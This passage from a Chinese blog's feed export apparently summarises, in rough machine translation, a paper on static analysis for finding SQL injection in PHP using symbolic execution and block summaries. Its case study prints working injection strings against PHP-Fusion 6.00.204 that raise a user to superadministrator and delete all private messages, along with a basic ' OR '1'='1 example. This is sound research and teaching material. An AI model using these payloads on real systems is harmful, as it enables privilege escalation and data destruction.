e$的答案。但是这种方案相比其他方案效率会低很多。</p><p>3）使用静态分析，推理整个程序，定位可能的跳转目标。实际中，源代码的间接跳转分析主要是指针分析。二进制的跳转静态分析推理在跳转目标表达式中哪些值可能被引用。例如，函数指针表通常实现为可能的跳转目标表。</p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://zhuanlan.zhihu.com/p/26927127">https://zhuanlan.zhihu.com/p/26927127</a><br><a href="http://pwn4.fun/2017/03/20/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%9F%BA%E7%A1%80/">http://pwn4.fun/2017/03/20/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%9F%BA%E7%A1%80/</a><br><a href="https://people.eecs.berkeley.edu/~ksen/papers/cacm13.pdf">https://people.eecs.berkeley.edu/~ksen/papers/cacm13.pdf</a><br><a href="https://www.anquanke.com/post/id/157928">https://www.anquanke.com/post/id/157928</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脚本语言中安全漏洞的静态检测(半机翻有删增)</title>
    <link href="/2019/02/27/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/02/27/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>我们提出了一种静态分析算法，用于检测PHP中的安全漏洞，PHP是一种用于构建Web应用程序的流行服务器端脚本语言。我们的分析<strong>采用了一种新颖的三层体系结构</strong>，**以在内部块，过程内和过程间级别以更低的粒度级别捕获信息。**这种架构使我们能够处理脚本语言的动态特性，这些特性尚未被先前技术充分解决。<br>我们在六个流行的开源PHP代码库中证明了我们的方法的有效性，发现了105个以前未知的安全漏洞，其中大多数我们认为可以远程利用。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>近年来，基于Web的应用程序迅速扩散，并已成为提供从论坛到银行和零售等安全敏感领域的在线服务的事实标准<br>因此，这些应用程序中的安全漏洞对这些服务的提供者和用户都构成了越来越大的威胁。在2004年下半年，赛门铁克编制了670个影响Web应用程序的漏洞，比2003年同期增加了81％。在可预见的未来，这种趋势可能会持续下去。</p><span id="more"></span><p>根据同一报告，这些漏洞<strong>通常是由输入验证中的编程错误和提交的请求的不当处理引起的</strong>。<br>由于漏洞通常深深嵌入程序逻辑中，因此传统的网络级防御（例如防火墙）无法提供足够的保护来抵御此类攻击。测试也基本上无效，因为攻击者通常使用最不期望的输入来利用这些漏洞并危及系统。</p><p>一种自然的替代方法是使用静态分析找出这些错误。这种方法已经在WebSSARI 和Minamide 中进行了探索。 WebSSARI已被用于在PHP脚本中查找许多安全漏洞，但由于其基于过程内类型的分析而具有大量误报和否定。 Minamide的系统检查PHP脚本的HTML输出的语法正确性，似乎不能有效地发现安全漏洞。</p><p>本文的主要信息是，脚本语言的分析不需要比传统语言的分析困难得多。虽然脚本语言强调静态分析的不同方面，但是为解决脚本语言的重要方面而设计的分析可以可靠地识别脚本中的许多严重漏洞并具有高度自动化。鉴于脚本在现实世界应用程序中的重要性，我们认为静态分析有机会在这个新领域产生重大影响。</p><p>在本文中，我们应用静态分析来发现PHP中的安全漏洞，PHP是一种服务器端脚本语言，已成为开发Web应用程序最广泛采用的平台之一.我们的目标是自动发现严重漏洞的错误检测工具很有信心。然而，这项工作并不旨在验证缺少错误。</p><p><strong>本文做出以下贡献：</strong></p><p>(1)<strong>我们提出了一个PHP的过程间静态分析算法</strong>。像PHP一样动态的语言为静态分析提出了独特的挑战：语言结构（例如，include ）允许动态包含程序代码，类型在执行期间发生变化的变量，具有依赖于操作数的运行时类型的语义的操作（例如， &lt;），并且普遍使用散列表和正则表达式匹配只是必须很好地建模以产生有用结果的一些特征。为了忠实地模拟这种语言中的程序行为，<strong>我们使用三层分析来捕获在块内，过程内和过程间级别上降低粒度级别的信息。<strong>这种体系结构允许在最重要的地方分析如 <strong>在内部块中，并且在较小程度上，在过程内层面,并且在函数调用的自然抽象边界处使用激进抽象来实现可伸缩性。<strong>我们使用</strong>符号执行</strong>来模拟基本块内的动态特征，并使用</strong>块概要</strong>来隐藏程序内和程序间分析的复杂性。我们相信相同的技术可以很容易地应用于其他脚本语言（例如，Perl）。</p><p>(2)<strong>我们将展示如何使用我们的静态分析算法来查找SQL注入漏洞</strong>。配置完成后，分析将完全自动完成。虽然我们在这项工作中专注于SQL注入，但是可以应用相同的技术来检测其他漏洞，例如跨站点脚本（XSS）和Web应用程序中的代码注入。</p><p>(3)**我们通过实施分析算法并在六个用PHP编写的流行Web应用程序上运行它来实验验证我们的方法，找到105个以前未知的安全漏洞。**我们分析了两个报告的PHP融合漏洞，这是一个成熟的，广泛部署的内容管理系统，并为两者构建漏洞，允许攻击者控制或破坏系统。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h2><p>本节简要介绍PHP语言，并显示PHP中SQL注入漏洞的示例。PHP是十年前由Rasmus Lerdorf创建的，它是一组简单的Perl脚本，用于跟踪对其在线简历的访问。它已经发展成为用于构建Web应用程序的最流行的服务器端脚本语言之一。根据最近的安全调查显示，PHP安装在44.6％的Apache Web服务器上，被数百万开发人员采用，并由雅虎，IBM，甲骨文和SAP等人使用或支持。</p><p>尽管PHP语言在过去十年中经历了两次重大的重新设计，但它保留了类似Perl的语法和动态（解释）特性，这有助于其最简单和灵活的声称优势。PHP有一套编程结构和特殊操作**，可以简化Web开发。我们举三个例子：**</p><h3 id="1-与SQL自然集成："><a href="#1-与SQL自然集成：" class="headerlink" title="1.与SQL自然集成："></a><strong>1.与SQL自然集成：</strong></h3><p>PHP为数据库操作提供了几乎原生的支持。例如，在字符串中使用内联变量，大多数SQL查询可以通过简单的函数调用简明地表达</p><pre><code class="hljs">$rows=mysql query(&quot;UPDATE users SETpass=‘$pass’ WHERE userid=‘$userid’&quot;);</code></pre><p>将此代码与Java进行对比，其中通常通过预准备语句访问数据库：一个创建语句模板并使用绑定变量填充值（及其类型）：</p><pre><code class="hljs">PreparedStatement s = con.prepareStatement(&quot;UPDATE users SET pass = ?WHERE userid = ?&quot;);s.setString(1, pass); s.setInt(2, userid);int rows = s.executeUpdate();</code></pre><h3 id="2-动态类型和来自字符串的隐式转换："><a href="#2-动态类型和来自字符串的隐式转换：" class="headerlink" title="2.动态类型和来自字符串的隐式转换："></a><strong>2.动态类型和来自字符串的隐式转换：</strong></h3><p>PHP与其他脚本语言一样，广泛支持字符串操作以及字符串和其他类型之间的自动转换。这些功能对于Web应用程序很方便，因为字符串充当浏览器，Web服务器和数据库后端之间的公共介质。例如，我们可以在没有显式强制转换的情况下将数字转换为字符串：</p><pre><code class="hljs">if ($userid &lt; 0) exit;$query = &quot;SELECT * from usersWHERE userid = ‘$userid’&quot;;</code></pre><h3 id="3-变量范围和环境："><a href="#3-变量范围和环境：" class="headerlink" title="3.变量范围和环境："></a><strong>3.变量范围和环境：</strong></h3><p>PHP有许多机制可以在从执行环境访问值时最大限度地减少冗余。例如，HTTP get和post请求会自动导入到全局名称空间中作为哈希表<code>$_GET</code>和<code>$_ POST</code>。要访问提交表单的“name”字段，可以直接在程序中使用<code>$_GET [&#39;name&#39;]</code>。<br>如果这听起来仍然太多，那么PHP提供了一个提取操作，可以自动将哈希表的所有键值对导入当前范围。在上面的示例中，可以使用extract（_GET，EXTR_OVERWRITE）来导入使用HTTP get方法提交的数据。要访问<code>$name</code>字段，现在只需键入<code>$name</code>，某些人更喜欢<code>$_GET[&#39;name&#39;]</code>。</p><p><strong>但是，这些便利性具有安全隐患：</strong></p><h3 id="1-SQL注入变得简单："><a href="#1-SQL注入变得简单：" class="headerlink" title="1.SQL注入变得简单："></a><strong>1.SQL注入变得简单：</strong></h3><p>Java中的绑定变量可以确保程序员传递给SQL查询的任何数据都是数据。对于PHP示例，不能说同样的情况，来自恶意攻击者的格式错误的数据可能会改变SQL语句的含义并导致对数据库的意外操作。这些通常称为SQL注入攻击。</p><p>在上面的示例中（情况1），假设<code>$userid</code>由攻击者控制并具有值’ OR ‘1’ &#x3D; ‘1 ,查询字符串变为</p><pre><code class="hljs">UPDATE users SET pass=’...’WHERE userid=’’ OR ’1’=’1’</code></pre><p>它具有更新数据库中所有用户的密码的效果</p><h3 id="2-隐式转换："><a href="#2-隐式转换：" class="headerlink" title="2.隐式转换："></a><strong>2.隐式转换：</strong></h3><p>请看一下</p><p>人们会期望，如果程序打印任何东西，它应该是“0”。不幸的是，PHP在将字符串值与整数进行比较之前会隐式地将其转换为数字。非数值（例如，“abc”）在没有投诉的情况下转换为0，因此上面的代码可以打印除非零数字之外的任何内容。如果随后使用<code>$userid</code>，我们可以想象一个潜在的SQL注入漏洞</p><h3 id="3-用户控制下的未初始化变量："><a href="#3-用户控制下的未初始化变量：" class="headerlink" title="3.用户控制下的未初始化变量："></a><strong>3.用户控制下的未初始化变量：</strong></h3><p>在PHP中，未初始化的变量默认为null。有些程序依靠这个事实来做出正确的行为;考虑以下代码：</p><pre><code class="hljs">extract($_GET, EXTR_OVERWRITE);for ($i=0;$i&lt;=7;$i++)$new pass .= chr(rand(97, 122)); // append one charmysql query(&quot;UPDATE . . . $new_pass . . .&quot;);</code></pre><p>该程序生成随机密码并将其插入数据库。但是，由于第1行的提取操作，恶意用户可以通过在提交的HTTP表单数据中添加意外的新传递字段来为$new_pass引入任意初始值。</p><pre><code class="hljs">CFG := build control flow graph(AST);foreach (basic block b in CFG)summaries[b] := simulate block(b);return make function summary(CFG, summaries);</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h2><p>给定一个PHP源文件，我们的工具按以下步骤执行静态分析：</p><p>(1)我们将PHP源解析为<strong>抽象语法树（AST）</strong>。我们的解析器基于PHP 5.0.5的标准开源实现。每个PHP源文件都包含一个主要部分（以下称为主要部分，虽然它不是任何函数定义的一部分）和零个或多个用户定义的函数。我们将用户定义的函数存储在环境中，<strong>并从main函数开始分析</strong>。</p><p>(2)单个函数的分析总结在上面 CFG 的代码示例中。对于程序中的每个函数，<strong>分析执行从函数体的抽象语法树（AST）到控制流图（CFG）的标准转换。</strong> CFG的节点是基本块：最大单个条目，单个退出语句序列。CFG的边缘是块之间的跳转关系。对于条件跳转，相应的CFG边缘用分支谓词标记。</p><p>(3)使用<strong>符号执行</strong>来模拟每个基本块。目标是理解块中语句对程序全局状态的集体影响，并将它们的效果总结为简明的块概要（其中描述了在进入块之前必须清理的变量集3）。 。我们在3.1节描述了仿真算法。</p><p>(4)在计算每个基本块的摘要之后，**我们使用标准可达性分析将块摘要组合成函数摘要。**函数摘要描述了函数的前后条件（例如，在调用当前函数之后的一组已清理的输入变量）。我们将在3.2节讨论这一步骤。</p><p>(5)在分析函数期间，我们可能会遇到对<strong>其他用户定义函数的调用</strong>。我们将在3.3节讨论建模函数调用以及函数分析的顺序。</p><h3 id="模拟基本块"><a href="#模拟基本块" class="headerlink" title="模拟基本块"></a><strong>模拟基本块</strong></h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h4><p>图2给出了伪代码，概述了符号模拟过程。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B1.png" alt="此处输入图片的描述"></p><p>回想一下每个基本块包含一个线性的语句序列，中间没有跳跃或跳跃目标。模拟以初始状态开始，其将每个变量x映射到符号初始值x0。它按顺序处理块中的每个语句，更新模拟器状态以反映该语句的效果。模拟继续进行，直到遇到以下任何一种情况：</p><p>1.块的结束;<br>2.返回声明。在这种情况下，当前块被标记为返回块，并且模拟器评估并记录返回值;<br>3.退出声明。在这种情况下，当前块被标记为出口块;<br>4.调用退出程序的用户定义函数。使用被叫方的功能摘要自动确定此条件（参见第3.2和3.3节）。</p><p>请注意，在最后一种情况下，程序的执行也已终止，因此我们从当前块中删除任何后续语句和传出CFG边缘。<br>在模拟基本块之后，我们使用模拟器最终状态中包含的信息来概括块对块汇总的影响，我们将其存储在过程内分析中使用（参见第3.2节）。模拟后，状态本身被丢弃。</p><p>以下小节详细描述了模拟过程。我们首先定义我们建模的PHP子集（第3.1.2节），并讨论在符号执行期间模拟状态和程序值（第3.1.3节，第3.1.4节）的表示。使用值表示，我们描述了分析器如何模拟表达式（§3.1.5）和语句（§3.1.6）。最后，我们描述我们如何表示和推断块摘要（第3.1.7节）。</p><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a><strong>语言</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B2.png" alt="此处输入图片的描述"></p><p>图3给出了一个<strong>小命令式语言的定义，该语言捕获了我们认为与SQL注入漏洞相关的PHP构造的子集</strong>。与PHP一样，语言是动态类型的。我们<strong>模拟三种基本类型的PHP值：字符串，布尔值和整数。</strong></p><p>另外，我们介绍一个特别的用于描述静态类型未确定的对象的类型（例如，输入参数)</p><p>表达式可以是常量，l-value，一元和二元运算以及类型转换。值得一提的是左值的定义，因为除了变量和函数参数之外，我们还包含一个命名的下标操作，以便对PHP程序中广泛使用的数组和哈希表访问提供有限的支持。<br>语句可以是赋值，函数调用，返回，退出或包含。前四种语句类型无需进一步说明。 </p><p>include语句是脚本语言独有的常用功能，它允许程序员动态地将代码插入到程序中。在我们的语言中，include计算其字符串参数，并执行由字符串指定的程序文件，就像它插入该程序点一样（例如，它共享相同的范围）。我们将在3.1.6节描述如何模拟这种行为。</p><h4 id="陈述"><a href="#陈述" class="headerlink" title="陈述"></a><strong>陈述</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B3.png" alt="此处输入图片的描述"></p><p>图4（a）给出了模拟过程中值和状态的定义。模拟状态将存储器位置映射到它们的值表示，其中存储器位置是程序变量（例如x），或者是通过另一个位置（例如x[key]）访问的散列表中的条目。<strong>请注意，位置的定义是递归的，因此我们的算法支持多级散列解引用。</strong></p><p>在进入函数时，每个位置L被隐式初始化为符号初始值L0，其构成模拟的初始状态。我们在状态中表示的值可以根据类型分为三类：</p><h5 id="字符串："><a href="#字符串：" class="headerlink" title="字符串："></a><strong>字符串：</strong></h5><p>字符串是许多脚本语言中最基本的类型，建模字符串的精度直接决定了分析的精确度。字符串通常通过串联构造。例如，用户输入（通过HTTP get和post方法）通常与预先构造的骨架连接以形成SQL查询。同样，查询的结果可以与HTML模板连接以形成输出。对连接进行建模可以使分析更好地理解脚本中的信息流。因此，我们的字符串表示基于连接。字符串值表示为字符串段的有序串联，可以是以下之一：字符串常量，进入当前块（l0）时的内存位置的初始值，或包含初始值零的字符串来自一组内存位置的更多元素（包含（σ））。我们使用最后一个表示来模拟函数调用的返回值，这些函数调用可能不确定地包含全局变量和输入参数的组合。例如，在</p><pre><code class="hljs">function f($a, $b) &#123;    if (. . .) return $a;    else return $b;&#125;$ret = f($x.$y, $z);</code></pre><p>我们将第5行的返回值表示为包含（{x，y，z}），以模拟它可以包含集合中的任何元素作为子字符串的事实。</p><p><strong>上面描述的字符串表示具有以下好处：</strong></p><p>**首先，**我们获得当前块内的字符串的自动常量折叠，这通常用于解析散列键和区分散列引用（例如，在<code>$key</code> &#x3D; “key”中;return <code>$hash[$key]</code>）。</p><p>**其次，**我们可以通过在后者的最终表示中查找前者的初始值的出现来跟踪一个输入变量的内容如何流入另一个输入变量。例如，在：<code>$a</code> &#x3D; <code>$a</code>.<code>$b</code>，<code>$a</code>的最终表示是<code>&lt;a0，b&gt;</code>我们知道如果<code>$a</code>或<code>$b</code>在进入当前块时包含未经过授权的用户输入，退出时<code>$a</code>也是如此。<br>**最后，**通过使用contains（σ）跟踪基于函数摘要的函数返回值，可以实现过程间数据流。我们在3.3节中更详细地描述了这个方面。</p><h5 id="布尔值："><a href="#布尔值：" class="headerlink" title="布尔值："></a><strong>布尔值：</strong></h5><p>在PHP中，执行输入验证的常用方法是调用一个返回true或false的函数，具体取决于输入是否格式正确。例如，以下代码清理<code>$userid</code>：</p><pre><code class="hljs">$ok = is safe($userid);if (!$ok) exit;</code></pre><p>调用后布尔变量<code>$ok</code>的值未确定，但它与<code>$userid</code>的安全性相关。这激发了解释（σ0，σ1）作为此类布尔值的表示：σ0（相应的σ1）表示布尔值为假时的有效l值的集合（resp，true）。在上面的示例中，<code>$ok</code>表示untaint（{}，{userid}）</p><p>除此之外，布尔的代表还包括常量（true and false）和 unknown</p><h5 id="整数："><a href="#整数：" class="headerlink" title="整数："></a><strong>整数：</strong></h5><p>我们的模拟中不太强调整数运算。我们跟踪整数常量以及它们之间的二元和一元运算。我们还支持从整数到布尔值和字符串值的类型转换。</p><h4 id="位置和L值"><a href="#位置和L值" class="headerlink" title="位置和L值"></a><strong>位置和L值</strong></h4><p>在图3中的语言定义中，散列引用可以通过赋值进行别名，而L值可以包含具有非常量键的散列访问。取决于主机和密钥的值，相同的L值可以指代不同的存储器位置，因此，L值不适合作为模拟状态中的存储器位置。</p><p>图4（b）给出了我们用于将L值解析为内存位置的规则。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B4.png" alt="此处输入图片的描述"></p><p>var和arg规则将每个程序变量和函数参数映射到由其名称标识的内存位置，并且dim规则通过首先将哈希表评估到位置然后附加密钥以形成哈希条目位置从而解析哈希访问。这些规则旨在在存在简单别名的情况下工作。考虑以下程序：</p><pre><code class="hljs">$hash = $_POST;$key = ’userid’;$userid = $hash[$key];</code></pre><p>该程序首先为哈希表$_POST创建一个别名（<code>$hash</code>），然后使用该别名访问userid条目。在进入块时，初始状态将每个位置映射到其初始值：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B5.png" alt="此处输入图片的描述"></p><p>根据var规则，每个变量映射到其自己的唯一位置。在前两个任务之后，状态是：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B6.png" alt="此处输入图片的描述"></p><p>我们使用dim规则解决第3行的<code>$hash[$key]</code>：<code>$hash</code>计算为<code>_POST0</code>，<code>$key</code>计算为常量字符串’userid’。因此，L值<code>$hash[$key]</code>计算到位置_POST[userid]，因此分析将所需值<code>_POST[userid]0</code>分配给<code>$userid</code>。</p><h4 id="表达"><a href="#表达" class="headerlink" title="表达"></a><strong>表达</strong></h4><p>我们基于上述值表示执行表达式的抽象评估。由于PHP是一种动态类型语言，因此操作数会隐式转换为表达式中的操作的适当类型。</p><p>图4（c）给出了模拟PHP中的强制转换操作的强制转换规则的代表性示例。例如，布尔值true，在字符串上下文中使用时，计算结果为“1”。另一方面，false被转换为空字符串而不是“0”。在无法精确表示的情况下，结果是unknown</p><p>图4（c）还给出了三种用于评估表达式的代表性规则。第一个规则处理L值，并通过首先将L值解析为内存位置，然后在评估上下文中查找位置（在进入块时回想起Γ(L)&#x3D; L0）来获得结果。</p><p>第二个规则模拟字符串连接。我们首先将两个操作数的值转换为字符串值，结果是两者的串联。</p><p>最终规则处理布尔否定。有趣的案例涉及不明确的值。回想一下，如果对集合σ0（相应的σ1）中的L值进行消毒，则untaint（σ0，σ1）表示未知的布尔值，该值为false（resp.true）。根据这个定义，unaint（σ0，σ1）的否定是不明确的（σ1，σ0）。</p><p>表达式的分析是不明确的，如果我们无法确定更精确的表示，这可能是漏报的潜在来源。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a><strong>实验结果</strong></h2><p>第3节中描述的分析<strong>已经实现为两个独立的部分</strong>：基于开源PHP5.0.5发行版的前端，<strong>将源文件解析为抽象语法树</strong>，以及用OCaml编写的后端，<strong>将AST读入内存并进行分析</strong>。这种分离可确保最大的兼容性，同时最小化对PHP 实现的依赖。</p><p>在intrablock，intraprocedural和interprocedural级别中使用不同抽象级别的决定使我们能够微调我们保留在一个级别的信息量，而不依赖于另一个级别的算法，并允许我们快速构建可用工具。<br>检查器很大程度上是自动的，几乎不需要人为干预。我们使用一小组查询函数（例如mysql查询）和清理操作（例如，数字）来为检查器播种。检查员自动推断其余部分。</p><p><strong>正则表达式匹配对自动化提出了挑战</strong>。正则表达式用于各种目的，包括但不限于输入验证。<br>一些正则表达式匹配格式良好的输入，而其他正则表达式检测格式错假设一种方式或另一种方式导致误报或漏报。</p><p>我们的解决方案是<strong>维护一个先前看到的正则表达式及其效果的数据库</strong>（如果有的话）。<br>默认情况下，以前看不见的正则表达式假定没有过滤效果，以免因错误判断而错过任何错误。为了使用户能够轻松指定正则表达式的清理效果，检查器具有交互模式，当分析遇到以前看不见的正则表达式时会提示用户，并记录用户的答案以供将来参考</p><p>**用户声明正则表达式的规则有将错误引入分析的真正潜力;**然而，实际上，我们发现这种方法非常有效，它帮助我们找到至少两个由于过于宽松的正则表达式而导致的漏洞。</p><p>们的工具在所有实验中收集了来自用户的49个正则表达式的信息（用户回答每次查询一次击键），因此用户的负担很小。</p><p>检查器通过使用主函数摘要中的信息来检测错误 - <strong>检查器将所有在进入时需要被检测的变量标记为潜在的安全漏洞</strong>。从检查器的角度来看，这些变量在环境中定义，用于构造SQL查询而不进行清理。但实际上，这些变量要么由运行时环境定义，要么由检查器不完全理解的某些语言结构定义（例如，我们在下面的案例研究中描述的PHP中的提取操作）。该工具发出错误信息，如果已知变量由用户控制（例如<code>$_GET[&#39;...&#39;]</code>，<code>$_POST [&#39;...&#39;]</code>，<code>$_COOKIE[&#39;...&#39;]</code>等）。对于其他，检查器会发出警告。</p><h3 id="案例研究：PHP融合中的两个可利用的SQL注入攻击"><a href="#案例研究：PHP融合中的两个可利用的SQL注入攻击" class="headerlink" title="案例研究：PHP融合中的两个可利用的SQL注入攻击"></a><strong>案例研究：PHP融合中的两个可利用的SQL注入攻击</strong></h3><p>在本节中，我们将展示两个关于PHP融合中可利用SQL注入漏洞的案例研究</p><p>我们的工具。 PHP-fusion是一个基于PHP和MySQL的开源内容管理系统（CMS）。它不包括特定于语言环境的自定义模块，它包含超过16,000行PHP代码，并且由于其速度，可定制性和丰富的功能而具有广泛的用户群。<br>浏览代码时，很明显，<strong>作者在编写安全性时考虑了安全性，并且在使用查询字符串之前已经特别注意清理输入</strong></p><p>我们的实验是在最新的6.00.204版软件上进行的。与我们检查的其他代码库不同，PHP-fusion使用提取操作将用户输入导入当前环境。例如，   <code>extract($_POST，EXTR_OVERWRITE)</code>具有将<code>$_POST</code>哈希表中的每个键的一个变量引入当前范围，并将<code>$_POST[key]</code>的值赋给该变量的效果。此功能减少了键入，但会导致检查器和安全漏洞混淆到软件中我们构建的两个漏洞都涉及使用未初始化的变量，其值可以由用户操作，因为提取操作。</p><p>由于PHP-fusion不直接从输入哈希值（如<code>$_GET</code> or <code>$_POST</code>）读取用户输入，因此我们的工具不会生成直接的错误消息。相反，我们检查警告（回想上面关于错误和警告的讨论），这些警告对应于安全敏感变量，其定义未被检查器解析（例如，通过提取操作引入，或从配置文件中读取）。</p><p>我们在PHPfusion中的所有顶级脚本上运行了我们的检查器。<br>该工具生成了22个唯一的警告，其中大部分与构建大量查询时使用的配置变量相关过滤掉后，4个不同文件中的7个警告仍然存在。我们相信7个警告中除了一个之外的所有警告都可能导致可利用的安全漏洞。唯一的误报来自于意外的过滤：</p><pre><code class="hljs">arises from an unanticipated sanitization:/* php-files/lostpassword.php */if (!preg match(&quot;/ˆ[0-9a-z]&#123;32&#125;$/&quot;, $account))$error = 1;if (!$error) &#123; /* database access using $account */ &#125;if ($error) redirect(&quot;index.php&quot;);</code></pre><p>程序不是根据 preg_match 的结果立即终止程序，而是将<code>$error</code>标志设置为true并延迟错误处理，这通常不是一个好习惯。可以通过在块摘要中添加更多信息来处理这个习惯用法。我们调查了剩余的潜在攻击警告的前两个，并确认两者在测试安装中确实可以利用</p><p>不出所料由于提取操作，两个错误都成为可能。我们在下面详细解释这两个错误</p><p><strong>1）用于恢复丢失密码的脚本中的漏洞</strong></p><p>这是一个可远程利用的漏洞，允许任何注册用户通过精心构建的URL提升其权限。我们在下面显示相关代码：</p><pre><code class="hljs">/* php-files/lostpassword.php */for ($i=0;$i&lt;=7;$i++)$new pass .= chr(rand(97, 122));. . .$result = dbquery(&quot;UPDATE &quot;.$db prefix.&quot;usersSET user_password=md5(’$new_pass’)WHERE user_id=’&quot;.$data[’user_id’].&quot;’&quot;);</code></pre><p>我们的工具发出了<code>$new_pass</code>的警告，在进入时未初始化，因此在正常执行期间默认为空字符串。该脚本继续向<code>$new_pass</code>（第23行）添加七个随机生成的字母，并将其用作用户的新密码（第5-7行）。正常执行下的SQL请求采用以下形式：</p><pre><code class="hljs">UPDATE users SET user password=md5(’???????’)WHERE user id=’userid’</code></pre><p>但是，恶意用户只需将新的传递字段添加到其HTTP请求中，例如，将以下字符串附加到密码提醒站点的URL：</p><pre><code class="hljs">&amp;new_pass=abc%27%29%2cuser_level=%27103%27%2cuser_aim=%28%27</code></pre><p>上面描述的提取操作将在当前变量范围内神奇地引入<code>$new_pass</code>，并带有以下初始值：</p><pre><code class="hljs">abc&#39;), user level =&#39;103&#39;, user aim = (&#39;</code></pre><p>SQL请求现在构造为：</p><pre><code class="hljs">UPDATE users SET user password=md5(’abc’),user level=’103’, user aim=(’???????’)WHERE user id=’userid’</code></pre><p>这里密码设置为 “abc”，用户权限提升到103，这意味着”超级管理员”。新推出的用户现在可以自由操作网站上的任何内容。</p><p><strong>2）消息传递子系统中的漏洞</strong></p><p>此漏洞利用了另一种可能未初始化的变量<code>$result</code>的使用，其中消息传递子系统中的消息ID。我们在图5中显示相关代码。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B7.png" alt="此处输入图片的描述"></p><p>我们的工具警告在消息ID中未使用<code>$result</code>的结果。在正常输入时，程序使用级联if语句初始化<code>$result</code> where message id。如代码所示，作者非常谨慎地清理用于构造消息id的<code>$result</code>的值。但是，if语句的级联序列没有默认分支。因此，<code>$result</code>可能在格式错误的输入上未初始化消息ID。我们利用这个事实，并追加</p><pre><code class="hljs">&amp;request where message id=1=1/*</code></pre><p>因此，在第11-13行提交的查询字符串变为：</p><pre><code class="hljs">DELETE FROM messages WHERE 1=1 /* AND . . .</code></pre><p>无论如何，”&#x2F; *:”在MySQL中被视为注释，因此被忽略。结果是丢失了系统中的所有私人消息。由于复杂的控制和数据流，不太可能通过代码审查或测试发现此错误。</p><p>我们向PHP-fusion的作者报告了这两个漏洞，他们立即修复了这些漏洞并发布了该软件的新版本。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><h3 id="静态技术"><a href="#静态技术" class="headerlink" title="静态技术"></a><strong>静态技术</strong></h3><p>WebSSARI是一种基于类型的PHP分析器**。它使用简单的过程内污点分析来查找用户控制的值流入需要可信输入的函数（即敏感函数）的情况**。该分析依赖于三个用户编写的“前奏”文件来提供有关以下方面的信息：</p><p>1）所有敏感功能的集合 - 需要过滤输入;<br>2）所有无操作的操作集;<br>3）不可信输入变量的集合。</p><p>不完整的规范导致大量的误报和漏报。</p><p>####<strong>WebSSARI有几个关键限制，限制了工具的精度和分析能力：</strong></p><h5 id="WebSSARI使用过程内算法，因此仅模拟不跨越功能边界的信息流。"><a href="#WebSSARI使用过程内算法，因此仅模拟不跨越功能边界的信息流。" class="headerlink" 